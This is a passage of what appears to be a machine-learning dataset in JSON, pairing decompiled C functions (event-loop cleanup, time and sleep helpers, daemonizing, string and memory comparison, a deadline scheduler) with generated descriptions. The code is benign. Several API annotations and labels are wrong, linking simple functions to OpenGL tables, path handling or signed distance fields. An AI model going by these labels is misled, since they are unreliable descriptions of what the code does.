            "exceptfds",
            ")",
            ";",
            "}",
            "}",
            "dword_1978",
            "=",
            "0",
            ";",
            "}",
            "LABEL_39",
            ":",
            "os_free",
            "(",
            "readfds",
            ")",
            ";",
            "os_free",
            "(",
            "writefds",
            ")",
            ";",
            "os_free",
            "(",
            "exceptfds",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v18",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __read seems to be used for reading data from various sources, such as devices, files, or checkpoints, potentially handling low-level interactions and system calls, with different implementations provided as weak symbols for flexibility in linking and customization.",
            "The function \"qword\" likely deals with handling or manipulating 64-bit quantities or quadruple words, possibly in a low-level programming context such as assembly language or systems programming.",
            "The function `os_malloc` appears to be part of a memory management module in a system, likely an operating system, providing functionality for dynamic memory allocation.",
            "The `alloc` function seems to be a part of a larger system, possibly a memory allocation subsystem, in a C program, managing various memory arenas, context initialization, and providing memory allocation utilities like `emalloc`, `erealloc`, and `estrdup`."
        ],
        "longer_label": "The provided code implements a function `eloop_run()` which manages event loops, socket operations, and signal handling in a system, utilizing low-level system calls such as `select()` for I/O multiplexing, dynamic memory allocation with `os_malloc()`, and handling of timeouts and signals within a loop structure, while annotations hint at the involvement of reading data from various sources and manipulation of 64-bit quantities."
    },
    {
        "id": 77,
        "docstring_tokens": [
            "The",
            "eloop_destroy",
            "function",
            "removes",
            "all",
            "remaining",
            "timeouts",
            ",",
            "destroys",
            "socket",
            "tables",
            "for",
            "readers",
            ",",
            "writers",
            ",",
            "and",
            "exceptions",
            ",",
            "and",
            "frees",
            "memory",
            "allocated",
            "for",
            "signals",
            "in",
            "the",
            "eloop",
            "structure",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "unsigned",
            "int",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_QWORD",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "os_get_reltime",
            "(",
            "&",
            "v5",
            ")",
            ";",
            "v3",
            "=",
            "qword_1950",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            "*",
            ")",
            "qword_1950",
            ";",
            "while",
            "(",
            "(",
            "__int64",
            "*",
            ")",
            "v3",
            "!",
            "=",
            "&",
            "qword_1950",
            ")",
            "{",
            "v1",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "-",
            "v5",
            ";",
            "v2",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "24",
            ")",
            "-",
            "v6",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "24",
            ")",
            "<",
            "v6",
            ")",
            "{",
            "-",
            "-",
            "v1",
            ";",
            "v2",
            "+",
            "=",
            "1000000",
            ";",
            "}",
            "wpa_printf",
            "(",
            "3L",
            "L",
            ",",
            "\"ELOOP: remaining timeout: %d.%06d eloop_data=%p user_data=%p handler=%p\"",
            ",",
            "v1",
            ",",
            "v2",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "40",
            ")",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "48",
            ")",
            ")",
            ";",
            "eloop_remove_timeout",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            ")",
            ";",
            "v3",
            "=",
            "(",
            "__int64",
            ")",
            "v4",
            ";",
            "v4",
            "=",
            "(",
            "_QWORD",
            "*",
            ")",
            "*",
            "v4",
            ";",
            "}",
            "eloop_sock_table_destroy",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1908",
            ")",
            ";",
            "eloop_sock_table_destroy",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1920",
            ")",
            ";",
            "eloop_sock_table_destroy",
            "(",
            "(",
            "__int64",
            ")",
            "dword_1938",
            ")",
            ";",
            "os_free",
            "(",
            "qword_1968",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v7",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is likely intended to read a value from the FS segment register on x86 architecture, commonly used for thread-local storage or accessing kernel data structures, within a program that involves dynamic memory allocation and string manipulation.",
            "The function \"os_get_rel\" is used to get the relative form of a path name by expressing the filename path relative to the base path, if possible, taking into account different operating systems and file systems.",
            "The function `wpa_printf` is used for conditional printing of debugging and error messages with varying priority levels, allowing output to stdout, stderr, and/or syslog based on specified conditions.",
            "The function \"table\" likely involves OpenGL graphics programming to create a visual representation of a table with its legs, given the provided code snippets which include functions for drawing walls, table legs, and defined constants/macros, possibly for use in a 3D rendering environment.",
            "The \"destroy\" function is used to clean up and release resources associated with a specific component or module when it is no longer needed or is being shut down."
        ],
        "longer_label": "The given code likely belongs to a program managing event loops, removing expired timeouts, destroying socket tables, and printing debugging information, while utilizing low-level functions for accessing thread-local storage and system-dependent file path manipulation."
    },
    {
        "id": 78,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "os_sleep",
            "''",
            "takes",
            "in",
            "seconds",
            "and",
            "microseconds",
            "as",
            "input",
            "and",
            "sleeps",
            "for",
            "those",
            "durations",
            "accordingly",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "int",
            "result",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "result",
            "=",
            "sleep",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "a2",
            ")",
            "return",
            "usleep",
            "(",
            "a2",
            ")",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `sleep` function appears to be part of an embedded systems or low-level programming environment, likely for a real-time operating system, where it is involved in handling interrupts, managing sleep modes, and potentially controlling system timing through functions like `seconds` and `nanoseconds`.",
            "The function \"return\" appears to be part of a larger program that involves defining structs, computing Signed Distance Fields (SDFs) for geometric shapes like capsules, creating interception contexts for device handling, and including a basic C program with a \"Hello World\" message, suggesting it's likely used to encapsulate various functionalities within a larger software system or framework."
        ],
        "longer_label": "The provided code defines a function `os_sleep` which handles sleep operations, potentially in a real-time operating system environment, with annotations indicating its integration into a larger software system involving structs, Signed Distance Fields (SDFs) computation, interception contexts for device handling, and inclusion of a basic C program, likely encapsulating various functionalities within a framework."
    },
    {
        "id": 79,
        "docstring_tokens": [
            "The",
            "code",
            "removes",
            "a",
            "job",
            "from",
            "a",
            "linked",
            "list",
            "based",
            "on",
            "a",
            "specific",
            "condition",
            ",",
            "including",
            "updating",
            "pointers",
            "and",
            "freeing",
            "memory",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "task_node",
            "*",
            "v0",
            ";",
            "node",
            "*",
            "next",
            ";",
            "task_node",
            "*",
            "v2",
            ";",
            "if",
            "(",
            "head",
            ")",
            "{",
            "v0",
            "=",
            "earliestDeadlineTaskNode",
            ";",
            "if",
            "(",
            "head",
            "=",
            "=",
            "earliestDeadlineTaskNode",
            ")",
            "{",
            "head",
            "=",
            "earliestDeadlineTaskNode",
            "-",
            ">",
            "next",
            ";",
            "free",
            "(",
            "earliestDeadlineTaskNode",
            ")",
            ";",
            "}",
            "else",
            "{",
            "next",
            "=",
            "earliestDeadlineTaskNode",
            "-",
            ">",
            "next",
            ";",
            "current",
            "=",
            "earliestDeadlineTaskNode",
            ";",
            "if",
            "(",
            "earliestDeadlineTaskNode",
            "=",
            "=",
            "next",
            ")",
            "{",
            "v2",
            "=",
            "earliestDeadlineTaskNode",
            ";",
            "}",
            "else",
            "{",
            "do",
            "{",
            "if",
            "(",
            "!",
            "next",
            ")",
            "next",
            "=",
            "head",
            ";",
            "v2",
            "=",
            "next",
            ";",
            "next",
            "=",
            "next",
            "-",
            ">",
            "next",
            ";",
            "}",
            "while",
            "(",
            "earliestDeadlineTaskNode",
            "!",
            "=",
            "next",
            ")",
            ";",
            "current",
            "=",
            "v2",
            ";",
            "}",
            "v2",
            "-",
            ">",
            "next",
            "=",
            "next",
            "-",
            ">",
            "next",
            ";",
            "free",
            "(",
            "v0",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code defines a function `remove_job()` to remove a task node from a linked list, based on its deadline, considering special cases for the head node and the earliest deadline task node."
    },
    {
        "id": 80,
        "docstring_tokens": [
            "The",
            "function",
            "os_get_time",
            "retrieves",
            "the",
            "current",
            "system",
            "time",
            "in",
            "seconds",
            "and",
            "microseconds",
            "and",
            "stores",
            "it",
            "in",
            "the",
            "given",
            "struct",
            "os_time",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "struct",
            "timeval",
            "*",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "struct",
            "timeval",
            "tv",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "LODWORD",
            "(",
            "result",
            ")",
            "=",
            "gettimeofday",
            "(",
            "&",
            "tv",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "*",
            "a1",
            "=",
            "tv",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `get_time` is defined multiple times with different signatures across the provided code snippets, suggesting its usage for retrieving the current time or timestamp in various contexts, possibly within network protocols or multimedia applications.",
            "The __readfsqword function is used to read a 64-bit value from the FS segment register on x86 architectures and from the GS segment register on x64 architectures.",
            "The function ORDresultgettime likely retrieves or calculates the time associated with an order result, possibly for tracking purposes or time-sensitive operations within a larger system."
        ],
        "longer_label": "The provided code defines a function `os_get_time` which retrieves the current time using the `gettimeofday` function and stores it in a `struct timeval`, potentially used in various contexts such as network protocols or multimedia applications, while also employing `__readfsqword` to read a 64-bit value from the FS segment register."
    },
    {
        "id": 81,
        "docstring_tokens": [
            "This",
            "code",
            "retrieves",
            "the",
            "current",
            "system",
            "time",
            "in",
            "seconds",
            "and",
            "microseconds",
            "and",
            "stores",
            "it",
            "in",
            "a",
            "structure",
            "called",
            "os_reltime",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "struct",
            "timeval",
            "*",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "struct",
            "timeval",
            "tv",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "LODWORD",
            "(",
            "result",
            ")",
            "=",
            "gettimeofday",
            "(",
            "&",
            "tv",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "*",
            "a1",
            "=",
            "tv",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `get_reltime` likely retrieves the current time and calculates the elapsed time since a specific reference point, used in scenarios such as checking timeouts for IEEE 802.11W authentication or starting accounting processes for stations in an access point.",
            "The function __readfsqword is used to read a 64-bit unsigned integer from a specific offset in the FS segment register on x86 architecture, typically employed in low-level system programming for accessing thread information block (TIB) or other data structures.",
            "The gettime function is used to retrieve the current time as a string and is also involved in handling wall clock times in the Serval daemon in milliseconds since the Unix epoch."
        ],
        "longer_label": "The provided code defines a function, `os_get_reltime`, likely intended to retrieve the current system time, store it in a `timeval` structure, and calculate the elapsed time since a reference point, possibly utilized for various system operations such as authentication timeouts or accounting processes in an access point environment, employing low-level x86 architecture techniques like reading from the FS segment register and utilizing the `gettimeofday` function for time retrieval."
    },
    {
        "id": 82,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "takes",
            "individual",
            "components",
            "of",
            "a",
            "date",
            "and",
            "time",
            ",",
            "checks",
            "if",
            "they",
            "are",
            "within",
            "valid",
            "ranges",
            ",",
            "converts",
            "them",
            "to",
            "a",
            "time",
            "structure",
            ",",
            "and",
            "then",
            "uses",
            "mktime",
            "to",
            "convert",
            "it",
            "to",
            "a",
            "time",
            "value",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "int",
            "a3",
            ",",
            "int",
            "a4",
            ",",
            "int",
            "a5",
            ",",
            "int",
            "a6",
            ",",
            "time_t",
            "*",
            "a7",
            ")",
            "{",
            "struct",
            "tm",
            "tp",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "1969",
            "|",
            "|",
            "a2",
            "<",
            "=",
            "0",
            "|",
            "|",
            "a2",
            ">",
            "12",
            "|",
            "|",
            "a3",
            "<",
            "=",
            "0",
            "|",
            "|",
            "a3",
            ">",
            "31",
            "|",
            "|",
            "a4",
            "<",
            "0",
            "|",
            "|",
            "a4",
            ">",
            "23",
            "|",
            "|",
            "a5",
            "<",
            "0",
            "|",
            "|",
            "a5",
            ">",
            "59",
            "|",
            "|",
            "a6",
            "<",
            "0",
            "|",
            "|",
            "a6",
            ">",
            "60",
            ")",
            "{",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "os_memset",
            "(",
            "&",
            "tp",
            ",",
            "0",
            ",",
            "56L",
            "L",
            ")",
            ";",
            "tp",
            ".",
            "tm_year",
            "=",
            "a1",
            "-",
            "1900",
            ";",
            "tp",
            ".",
            "tm_mon",
            "=",
            "a2",
            "-",
            "1",
            ";",
            "tp",
            ".",
            "tm_mday",
            "=",
            "a3",
            ";",
            "tp",
            ".",
            "tm_hour",
            "=",
            "a4",
            ";",
            "tp",
            ".",
            "tm_min",
            "=",
            "a5",
            ";",
            "tp",
            ".",
            "tm_sec",
            "=",
            "a6",
            ";",
            "*",
            "a7",
            "=",
            "mktime",
            "(",
            "&",
            "tp",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read an unsigned 64-bit integer from a specific offset in the FS segment register, with different implementations for different processor architectures."
        ],
        "longer_label": "The provided code defines a function `os_mktime` which converts a given date and time into a Unix timestamp, utilizing system calls such as `mktime` and low-level memory operations, while also performing validation checks on the input parameters."
    },
    {
        "id": 83,
        "docstring_tokens": [
            "This",
            "code",
            "converts",
            "a",
            "given",
            "time",
            "value",
            "to",
            "a",
            "struct",
            "representing",
            "the",
            "GMT",
            "time",
            "and",
            "assigns",
            "the",
            "individual",
            "components",
            "(",
            "seconds",
            ",",
            "minutes",
            ",",
            "hours",
            ",",
            "day",
            ",",
            "month",
            ",",
            "year",
            ")",
            "to",
            "the",
            "corresponding",
            "fields",
            "in",
            "the",
            "provided",
            "struct",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "time_t",
            "a1",
            ",",
            "int",
            "*",
            "a2",
            ")",
            "{",
            "time_t",
            "timer",
            ";",
            "struct",
            "tm",
            "*",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "timer",
            "=",
            "a1",
            ";",
            "v4",
            "=",
            "gmtime",
            "(",
            "&",
            "timer",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "*",
            "a2",
            "=",
            "v4",
            "-",
            ">",
            "tm_sec",
            ";",
            "a2",
            "[",
            "1",
            "]",
            "=",
            "v4",
            "-",
            ">",
            "tm_min",
            ";",
            "a2",
            "[",
            "2",
            "]",
            "=",
            "v4",
            "-",
            ">",
            "tm_hour",
            ";",
            "a2",
            "[",
            "3",
            "]",
            "=",
            "v4",
            "-",
            ">",
            "tm_mday",
            ";",
            "a2",
            "[",
            "4",
            "]",
            "=",
            "v4",
            "-",
            ">",
            "tm_mon",
            "+",
            "1",
            ";",
            "a2",
            "[",
            "5",
            "]",
            "=",
            "v4",
            "-",
            ">",
            "tm_year",
            "+",
            "1900",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The gmtime function is used to convert a time_t value representing a point in Universal Coordinated Time (UTC) into a broken-down time structure representing the corresponding Coordinated Universal Time (UTC) time.",
            "The function __readfsqword is used to read a 64-bit unsigned integer value from the FS segment register on x86 architecture, providing access to specific data stored in the thread information block (TIB) or other FS-relative data structures."
        ],
        "longer_label": "The code is a function `os_gmtime` which takes a time value `a1`, converts it to Coordinated Universal Time (UTC) using `gmtime`, stores the components of the time (seconds, minutes, hours, day, month, year) in an array `a2`, and returns `0` if successful, or `0xFFFFFFFFFFFFFFFF` if conversion fails, with the use of the `__readfsqword` function to access thread information."
    },
    {
        "id": 84,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "daemon",
            "process",
            "and",
            "writes",
            "its",
            "PID",
            "to",
            "a",
            "specified",
            "file",
            "if",
            "a",
            "file",
            "path",
            "is",
            "provided",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "*",
            "v1",
            ";",
            "char",
            "*",
            "v2",
            ";",
            "unsigned",
            "int",
            "v4",
            ";",
            "FILE",
            "*",
            "stream",
            ";",
            "if",
            "(",
            "daemon",
            "(",
            "0",
            ",",
            "0",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "_errno_location",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "strerror",
            "(",
            "*",
            "v1",
            ")",
            ";",
            "wpa_printf",
            "(",
            "5L",
            "L",
            ",",
            "\"daemon: %s\"",
            ",",
            "v2",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "stream",
            "=",
            "fopen",
            "(",
            "a1",
            ",",
            "\"w\"",
            ")",
            ";",
            "if",
            "(",
            "stream",
            ")",
            "{",
            "v4",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "fprintf",
            "(",
            "stream",
            ",",
            "\"%u\\n\"",
            ",",
            "v4",
            ")",
            ";",
            "fclose",
            "(",
            "stream",
            ")",
            ";",
            "}",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `strerror` is used to retrieve a string representation of a given error code, providing human-readable descriptions for error conditions encountered during program execution.",
            "The wpa_printf function is used to print conditional debugging and error messages, with the output being directed to stdout, stderr, and/or syslog based on the level of priority of the message.",
            "The function \"getpidfprintf\" likely retrieves the process ID and prints it to a file stream, combining functionality to obtain the process ID and write it to a file in C programming."
        ],
        "longer_label": "The provided C code defines a function `os_daemonize` that daemonizes the current process, prints any encountered error using `wpa_printf`, and if provided a file name, writes the process ID to that file using `fprintf`, with error handling for each step."
    },
    {
        "id": 85,
        "docstring_tokens": [
            "This",
            "code",
            "opens",
            "/dev/urandom",
            "to",
            "get",
            "random",
            "bytes",
            "and",
            "reads",
            "them",
            "into",
            "the",
            "provided",
            "buffer",
            ",",
            "returning",
            "-1",
            "if",
            "the",
            "read",
            "is",
            "incomplete",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "void",
            "*",
            "a1",
            ",",
            "size_t",
            "a2",
            ")",
            "{",
            "FILE",
            "*",
            "stream",
            ";",
            "size_t",
            "v4",
            ";",
            "stream",
            "=",
            "fopen",
            "(",
            "\"/dev/urandom\"",
            ",",
            "\"rb\"",
            ")",
            ";",
            "if",
            "(",
            "stream",
            ")",
            "{",
            "v4",
            "=",
            "fread",
            "(",
            "a1",
            ",",
            "1uL",
            "L",
            ",",
            "a2",
            ",",
            "stream",
            ")",
            ";",
            "fclose",
            "(",
            "stream",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "a2",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Could not open /dev/urandom.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"fopen\" is used to open a file and return a pointer to a structure that describes the file."
        ],
        "longer_label": "The code uses the \"fopen\" function to open the \"/dev/urandom\" file, read random data from it using \"fread\", and return either 0 or 0xFFFFFFFFL based on the success of the operation."
    },
    {
        "id": 86,
        "docstring_tokens": [
            "This",
            "code",
            "compares",
            "two",
            "memory",
            "blocks",
            "up",
            "to",
            "a",
            "certain",
            "size",
            "and",
            "returns",
            "the",
            "difference",
            "between",
            "the",
            "first",
            "differing",
            "elements",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "a3",
            ";",
            "if",
            "(",
            "!",
            "a3",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "*",
            "a2",
            ")",
            "{",
            "+",
            "+",
            "a1",
            ";",
            "+",
            "+",
            "a2",
            ";",
            "if",
            "(",
            "!",
            "-",
            "-",
            "v4",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "__int8",
            ")",
            "*",
            "a1",
            "-",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "unsigned",
            "__int8",
            ")",
            "*",
            "a2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"memcmp\" function compares a specified number of bytes from two memory blocks and returns zero if they are equal, or a non-zero value if they are not."
        ],
        "longer_label": "The provided code is an optimized implementation of the \"memcmp\" function in C, which compares a specified number of bytes from two memory blocks and returns zero if they are equal, or a non-zero value if they are not."
    },
    {
        "id": 87,
        "docstring_tokens": [
            "This",
            "code",
            "compares",
            "two",
            "strings",
            "character",
            "by",
            "character",
            "and",
            "returns",
            "the",
            "difference",
            "between",
            "the",
            "first",
            "differing",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ")",
            "{",
            "while",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "*",
            "a2",
            "&",
            "&",
            "*",
            "a1",
            ")",
            "{",
            "+",
            "+",
            "a1",
            ";",
            "+",
            "+",
            "a2",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "(",
            "char",
            ")",
            "*",
            "a1",
            "-",
            "(",
            "char",
            ")",
            "*",
            "a2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The provided code snippets suggest that the `strcmp` function is used for comparing strings, specifically in conditional statements to check if a string matches certain predefined values, such as operator names or function names, within a larger program written in a language similar to C."
        ],
        "longer_label": "The provided code is an implementation of a custom `strcmp` function for comparing strings, primarily intended for use within conditional statements to evaluate string equality within a program resembling C, with the annotation highlighting its usage in comparing predefined values like operator or function names."
    },
    {
        "id": 88,
        "docstring_tokens": [
            "This",
            "code",
            "compares",
            "two",
            "strings",
            "up",
            "to",
            "a",
            "specified",
            "length",
            "and",
            "returns",
            "the",
            "difference",
            "between",
            "the",
            "first",
            "non-matching",
            "characters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "a3",
            ";",
            "if",
            "(",
            "!",
            "a3",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "*",
            "a1",
            "=",
            "=",
            "*",
            "a2",
            "&",
            "&",
            "*",
            "a1",
            ")",
            "{",
            "+",
            "+",
            "a1",
            ";",
            "+",
            "+",
            "a2",
            ";",
            "if",
            "(",
            "!",
            "-",
            "-",
            "v4",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "(",
            "char",
            ")",
            "*",
            "a1",
            "-",
            "(",
            "char",
            ")",
            "*",
            "a2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `strncmp` function is a C standard library function used for comparing two strings up to a specified length, returning an integer indicating their relative order, with a provided snippet showcasing its usage within conditional statements and string comparison contexts."
        ],
        "longer_label": "The provided code is a custom implementation of the `strncmp` function in C, comparing two strings up to a specified length and returning an integer indicating their relative order, with annotations explaining its usage and purpose."
    },
    {
        "id": 89,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "copies",
            "a",
            "specified",
            "number",
            "of",
            "characters",
            "from",
            "the",
            "source",
            "string",
            "to",
            "the",
            "destination",
            "string",
            ",",
            "stopping",
            "when",
            "a",
            "null",
            "character",
            "is",
            "encountered",
            "or",
            "the",
            "specified",
            "number",
            "of",
            "characters",
            "has",
            "been",
            "copied",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "_BYTE",
            "*",
            "v3",
            ";",
            "_BYTE",
            "*",
            "v4",
            ";",
            "_BYTE",
            "*",
            "v5",
            ";",
            "_BYTE",
            "*",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "v9",
            "=",
            "a2",
            ";",
            "v10",
            "=",
            "a3",
            ";",
            "if",
            "(",
            "a3",
            ")",
            "{",
            "do",
            "{",
            "if",
            "(",
            "!",
            "-",
            "-",
            "v10",
            ")",
            "break",
            ";",
            "v3",
            "=",
            "v9",
            "+",
            "+",
            ";",
            "v4",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "*",
            "v4",
            "=",
            "*",
            "v3",
            ";",
            "}",
            "while",
            "(",
            "*",
            "v4",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v10",
            ")",
            "{",
            "if",
            "(",
            "a3",
            ")",
            "*",
            "a1",
            "=",
            "0",
            ";",
            "do",
            "v5",
            "=",
            "v9",
            "+",
            "+",
            ";",
            "while",
            "(",
            "*",
            "v5",
            ")",
            ";",
            "}",
            "return",
            "v9",
            "-",
            "a2",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"strlc\" appears to be used for copying and concatenating strings while ensuring proper buffer size management and memory allocation."
        ],
        "longer_label": "The provided code defines a function named \"os_strlcpy\" which copies a string from \"a2\" to \"a1\" while ensuring proper buffer size management, with the function returning the length of the copied string."
    },
    {
        "id": 90,
        "docstring_tokens": [
            "The",
            "code",
            "runs",
            "a",
            "scheduler",
            "that",
            "executes",
            "tasks",
            "with",
            "the",
            "earliest",
            "deadline",
            "first",
            ",",
            "updating",
            "the",
            "remaining",
            "time",
            "for",
            "each",
            "task",
            "and",
            "resetting",
            "it",
            "after",
            "completion",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "bool",
            "v0",
            ";",
            "task_node",
            "*",
            "v1",
            ";",
            "task_node",
            "*",
            "v2",
            ";",
            "task_node",
            "*",
            "v3",
            ";",
            "bool",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "task_node",
            "*",
            "v9",
            ";",
            "bool",
            "v10",
            ";",
            "v0",
            "=",
            "shouldRunCurrentJob",
            ";",
            "v1",
            "=",
            "head",
            ";",
            "if",
            "(",
            "shouldRunCurrentJob",
            ")",
            "{",
            "do",
            "{",
            "current",
            "=",
            "v1",
            ";",
            "earliestDeadlineTaskNode",
            "=",
            "v1",
            ";",
            "if",
            "(",
